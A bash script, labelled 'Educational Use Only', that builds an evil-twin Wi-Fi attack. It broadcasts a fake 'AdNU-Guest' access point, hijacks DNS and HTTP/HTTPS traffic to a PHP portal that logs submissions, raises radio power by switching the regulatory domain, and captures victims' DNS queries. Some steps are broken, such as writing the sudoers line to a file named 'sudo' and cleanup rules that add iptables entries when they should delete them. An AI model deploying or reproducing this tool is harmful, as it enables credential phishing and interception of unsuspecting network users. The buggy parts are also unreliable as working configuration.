#!/bin/bash

################################################################################
# CAPTIVE PORTAL SETUP SCRIPT
# Educational Use Only - Requires Authorization
################################################################################

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Function to print colored messages
print_status() {
    echo -e "${BLUE}[*]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[✓]${NC} $1"
}

print_error() {
    echo -e "${RED}[✗]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[!]${NC} $1"
}

# Function to check if running as root
check_root() {
    if [ "$EUID" -ne 0 ]; then
        print_error "This script must be run as root (use sudo)"
        exit 1
    fi
}

################################################################################
# PHASE 0: INSTALLATION AND SETUP
################################################################################

install_dependencies() {
    print_status "Installing dependencies and drivers..."
    
    apt update
    apt install -y net-tools aircrack-ng dnsmasq apache2 php bridge-utils hostapd \
                   wireshark iptables ipset build-essential dkms git bc \
                   linux-headers-$(uname -r) tshark realtek-rtl8188eus-dkms
    
    if [ $? -eq 0 ]; then
        print_success "Dependencies installed successfully"
    else
        print_error "Failed to install dependencies"
        exit 1
    fi
}

blacklist_driver() {
    print_status "Blacklisting default driver..."
    echo 'blacklist r8188eu' | tee /etc/modprobe.d/realtek-wn722n-fix.conf
    print_success "Driver blacklisted"
}

setup_config_files() {
    print_status "Creating configuration files..."
    
    # Create dnsmasq config
    cat > /etc/dnsmasq.conf <<EOF
# Listen only on the captive portal interface
interface=at0
bind-interfaces

# DHCP configuration
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1  # Router/Gateway
dhcp-option=6,10.0.0.1  # DNS Server
dhcp-option=15,          # Domain Name (optional)
dhcp-option=28,255.255.255.0  # Subnet Mask

# DNS hijacking for captive portal
address=/captive.apple.com/10.0.0.1
address=/connectivitycheck.gstatic.com/10.0.0.1
address=/msftconnecttest.com/10.0.0.1
address=/neverssl.com/10.0.0.1
address=/clients3.google.com/generate_204/10.0.0.1
address=/connectivitycheck.android.com/generate_204/10.0.0.1

address=/portal.local/10.0.0.1

# Optional: Add upstream DNS for fallback
# server=8.8.8.8
# server=1.1.1.1

# Logging
log-queries
log-dhcp
EOF
    print_success "Created /etc/dnsmasq.conf"

    # Check if index.php exists and has captive portal detection
    if [ ! -f /var/www/html/index.php ]; then
        print_warning "index.php not found in /var/www/html/"
        print_warning "Please copy your index.php file to /var/www/html/ before running Phase 3"
    else
        if grep -q "captive.apple.com" /var/www/html/index.php && grep -q "connectivitycheck.gstatic.com" /var/www/html/index.php; then
            print_success "index.php found with captive portal detection"
        else
            print_error "index.php found but MISSING captive portal detection code!"
            print_warning "Your index.php must handle requests for:"
            print_warning "  - captive.apple.com (iOS/macOS)"
            print_warning "  - connectivitycheck.gstatic.com (Android)"
            print_warning "  - msftconnecttest.com (Windows)"
        fi
    fi
    
    # Set file permissions
    touch /var/www/html/submissions.log
    chown www-data:www-data /var/www/html/submissions.log
    print_success "Set file permissions"
    
    # Configure Apache directory index
    if grep -q "DirectoryIndex index.php" /etc/apache2/mods-enabled/dir.conf; then
        print_success "Apache already configured for index.php priority"
    else
        print_warning "Manual check needed: Ensure index.php is first in /etc/apache2/mods-enabled/dir.conf"
    fi
    
    # Set power limit
    iw reg set BO
    print_success "Set initial power limit"
}

setup_apache_virtualhost() {
    print_status "Configuring Apache Virtual Host..."
    
    cat > /etc/apache2/sites-available/000-default.conf <<EOF
<VirtualHost *:80>
    ServerName 10.0.0.1
    ServerAlias *
    DocumentRoot /var/www/html
    
    <Directory /var/www/html>
        Options -Indexes +FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>
    
    ErrorLog \${APACHE_LOG_DIR}/error.log
    CustomLog \${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
EOF
    
    # Ensure index.php is prioritized
    sed -i 's/DirectoryIndex.*/DirectoryIndex index.php index.html index.cgi index.pl index.xhtml index.htm/' /etc/apache2/mods-enabled/dir.conf
    
    # Enable PHP and rewrite module
    a2enmod php*
    a2enmod rewrite
    
    systemctl restart apache2
    print_success "Apache Virtual Host configured"
    print_success "PHP module enabled and index.php prioritized"
}

setup_captiveportal() {
    print_status "Configuring Captive Portal..."

    # Create .htaccess for automatic captive portal
    cat > /var/www/html/.htaccess <<EOF
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} !-f 
#INSERT# 
RewriteRule .? http://10.0.0.1/index.php [L,QSA]
EOF

    # Add this line to visudo for index.php backend authentication
    LINE="www-data ALL=(ALL) NOPASSWD: /usr/sbin/ipset -exist add allowed_clients * timeout 300"

    if ! grep -qF "$LINE" /etc/sudoers; then
        # If grep does not find the line, the condition is true
        echo "$LINE" >> sudo EDITOR='tee -a' visudo > /dev/null
        echo "Line added."
    else
        echo "Line already exists. Not adding."
    fi
    
    # Copy the files from the directory of the script to /var/www/html/
    print_status "Adding the files to /var/www/html/ ..."

    SOURCE_DIR="$PWD"
    DEST_DIR="/var/www/html/"

    rsync -avm --update --progress --include="index.php" --include="footer.png" --include="logo.png" --include="success.html" --exclude="*" "$SOURCE_DIR"/ "$DEST_DIR"

    print_success "Captive Portal Configured"
}

################################################################################
# PHASE 3: EXECUTION AND LAUNCH
################################################################################

start_monitor_mode() {
    print_status "Stopping conflicting services..."
    systemctl stop NetworkManager
    systemctl stop wpa_supplicant

    print_status "Starting monitor mode and AP broadcast..."
    
    # Kill conflicting processes
    airmon-ng check kill
    
    # Start monitor mode
    airmon-ng start wlan1
    sleep 5
    
    # Launch AP
    airbase-ng -e "AdNU-Guest" -c 1 wlan1 &
    print_status "Waiting for at0 interface creation..."
    sleep 10
    
    # Bring up at0 interface
    ip link set dev at0 up
    ifconfig at0 10.0.0.1 netmask 255.255.255.0 up
    print_success "Monitor mode and AP started"
}

check_netconnection() { # Changed to checking ethernet link since we don't need to bridge the interfaces.
    print_status "Checking ethernet link..."
    
    if [ -d /sys/class/net/eth0 ]; then
        ETH_CARRIER_FILE="/sys/class/net/eth0/carrier"
        ETH_STATE_OK=1
        if [ -f "$ETH_CARRIER_FILE" ]; then
            if grep -q "1" "$ETH_CARRIER_FILE" 2>/dev/null; then
                print_status "eth0 is up"
            else
                print_warning "eth0 appears unplugged. NAT will be disabled until eth0 is connected."
                ETH_STATE_OK=0
            fi
        else
            # Fallback: check link state
            if ip link show eth0 2>/dev/null | grep -q "state UP"; then
                print_status "eth0 is up"
            else
                print_warning "eth0 appears down. NAT will be disabled until eth0 is connected."
                ETH_STATE_OK=0
            fi
        fi
    else
        print_warning "eth0 not present on this system"
        ETH_STATE_OK=0
    fi

    # Export a flag for later functions to know if eth0 is usable
    if [ "$ETH_STATE_OK" = "1" ]; then
        export CAPTIVE_ETH_UP=1
    else
        export CAPTIVE_ETH_UP=0
    fi
    
    # Enable IP forwarding
    sysctl -w net.ipv4.ip_forward=1
    
    print_success "Checking connection status completed"
}

configure_iptables() {
    print_status "Configuring iptables rules..."
    
    # Create ipset for allowed clients
    ipset create allowed_clients hash:ip timeout 600
    
    # Clear existing rules
    /sbin/iptables -t nat -F
    /sbin/iptables -t filter -F
    
    # NAT rules
    if [ "${CAPTIVE_ETH_UP:-0}" = "1" ]; then
        /sbin/iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
        /sbin/iptables -A FORWARD -i eth0 -o at0 -m state --state RELATED,ESTABLISHED -j ACCEPT
        /sbin/iptables -A FORWARD -i at0 -o eth0 -j ACCEPT
        print_success "NAT MASQUERADE enabled"
    else
        print_warning "eth0 not available - NAT disabled"
    fi
    
    iptables -t nat -F PREROUTING

    # Allow authenticated clients first
    /sbin/iptables -t nat -A PREROUTING -i at0 -m set --match-set allowed_clients src -j RETURN
    # /sbin/iptables -t nat -A PREROUTING -s 10.0.0.1 -j RETURN

    # DNS redirect for unauthenticated clients
    # /sbin/iptables -A FORWARD -i at0 ! -m set --match-set allowed_clients src -j DROP
    /sbin/iptables -t nat -A PREROUTING -i at0 -p udp --dport 53 -j DNAT --to 10.0.0.1
    /sbin/iptables -t nat -A PREROUTING -i at0 -p tcp --dport 53 -j DNAT --to 10.0.0.1

    # HTTP redirect for captive portal
    /sbin/iptables -t nat -A PREROUTING -i at0 -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80

    # HTTPS redirect to captive portal
    /sbin/iptables -t nat -A PREROUTING -i at0 -p tcp --dport 443 -j REDIRECT --to-port 80
 
    print_success "iptables rules configured"
}

start_services() {
    print_status "Starting services..."
    
    # Stop default dnsmasq
    systemctl stop dnsmasq
    
    # Start dnsmasq with custom config
    dnsmasq -C /etc/dnsmasq.conf -d &
    sleep 2
    
    # Restart Apache
    systemctl restart apache2
    
    print_success "Services started"
    print_success "Captive portal active at: http://10.0.0.1/"
    print_status "Testing Apache response..."
    
    # Test if Apache is responding
    if curl -s -I http://10.0.0.1/ | grep -q "200\|302"; then
        print_success "Apache is responding correctly"
    else
        print_error "Apache may not be configured correctly!"
        print_warning "Check: sudo systemctl status apache2"
    fi
    
    print_warning "To capture DNS traffic, run: sudo wireshark &"
    print_warning "Then select 'at0' or 'fake' interface with filter: udp port 53"
    
    print_status "Network Status:"
    echo "  - SSID: AdNU-Guest"
    echo "  - Gateway: 10.0.0.1"
    echo "  - DHCP Range: 10.0.0.10 - 10.0.0.100"
}

################################################################################
# PHASE 4: CLEANUP
################################################################################

cleanup() {
    print_status "Stopping services and cleaning up..."
    
    # Stop services
    pkill dnsmasq
    pkill airbase-ng
    systemctl stop apache2
    sysctl -w net.ipv4.ip_forward=0
    
    print_status "Removing iptables rules..."
    
    # Remove HTTPS redirect 
    /sbin/iptables -t nat -A PREROUTING -i at0 -p tcp --dport 443 -j REDIRECT --to-port 80 2>/dev/null
    
    # Remove HTTP redirect
    /sbin/iptables -t nat -A PREROUTING -i at0 -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80 2>/dev/null
    
    # Remove DNS hijacking
    /sbin/iptables -t nat -D PREROUTING -i at0 -p tcp --dport 53 -j DNAT --to 10.0.0.1 2>/dev/null 
    /sbin/iptables -t nat -D PREROUTING -i at0 -p udp --dport 53 -j DNAT --to 10.0.0.1 2>/dev/null
    
    # Remove forwarding rules
    /sbin/iptables -D FORWARD -i eth0 -o at0 -m state --state RELATED,ESTABLISHED -j ACCEPT 2>/dev/null
    /sbin/iptables -D FORWARD -i at0 -o eth0 -j ACCEPT 2>/dev/null

    # Remove ipset and iptables for mac addresses
    # /sbin/iptables -t nat -D PREROUTING -i at0 -m set --match-set allowed_clients src -j ACCEPT 2>/dev/null
    ipset destroy allowed_clients
    
    # Remove NAT
    /sbin/iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE 2>/dev/null

    # Clean up iptables and ipset
    /sbin/iptables -t nat -F
    /sbin/iptables -t filter -F
    ipset destroy allowed_clients 2>/dev/null || true
    
    # Stop monitor mode
    airmon-ng stop wlan1
    ip link set wlan1 down
    iw dev wlan1 set type managed
    iw reg set PH
    service NetworkManager restart
    
    print_success "Cleanup complete"
}

process_captures() {
    print_status "Processing capture files..."

    USER_HOME=$(eval echo "~$SUDO_USER")
    CAPTURE_FILE="$USER_HOME/log.pcapng"

    if [ -f "$CAPTURE_FILE" ]; then
        tshark -r "$CAPTURE_FILE" -Y "dns.qry.name" -T fields -e dns.qry.name | sort | uniq -c > /tmp/domains.txt
        print_success "DNS queries processed and saved to /tmp/domains.txt"
        
        # Securely delete raw captures
        rm -f "$CAPTURE_FILE"
        rm -f /var/www/html/submissions.log
        print_success "Raw data deleted"
    else
        print_warning "No capture file found at $CAPTURE_FILE"
    fi
}

################################################################################
# MAIN MENU
################################################################################

show_menu() {
    echo ""
    echo "=========================================="
    echo "   CAPTIVE PORTAL SETUP SCRIPT"
    echo "   Educational Use Only"
    echo "=========================================="
    echo ""
    echo "1) Install Dependencies (Run once, requires reboot)"
    echo "2) Setup Configuration Files"
    echo "3) Start Captive Portal"
    echo "4) Cleanup and Stop"
    echo "5) Process Capture Data"
    echo "6) Exit"
    echo ""
}

main() {
    check_root
    
    while true; do
        show_menu
        read -p "Select option: " choice
        
        case $choice in
            1)
                install_dependencies
                blacklist_driver
                print_warning "REBOOT REQUIRED! Run 'sudo reboot' now"
                ;;
            2)
                setup_captiveportal
                setup_config_files
                setup_apache_virtualhost
                print_success "Configuration complete"
                ;;
            3)
                start_monitor_mode
                check_netconnection
                configure_iptables
                start_services
                print_success "Captive portal is now running!"
                ;;
            4)
                cleanup
                ;;
            5)
                process_captures
                ;;
            6)
                print_status "Exiting..."
                exit 0
                ;;
            *)
                print_error "Invalid option"
                ;;
        esac
    done
}

# Run main function
main
